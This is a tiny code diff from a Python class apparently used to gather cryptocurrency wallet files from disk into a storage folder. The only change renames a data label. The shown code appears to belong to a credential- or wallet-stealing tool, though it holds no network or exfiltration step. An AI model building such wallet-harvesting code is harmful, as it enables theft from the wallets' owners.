@@ -34,7 +34,7 @@ class Wallets:
                 continue
 
             self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
-            self.__storage.add_data("Wallets", wallet["name"])
+            self.__storage.add_data("Wallet", wallet["name"])
 
     def run(self) -> Data:
         """
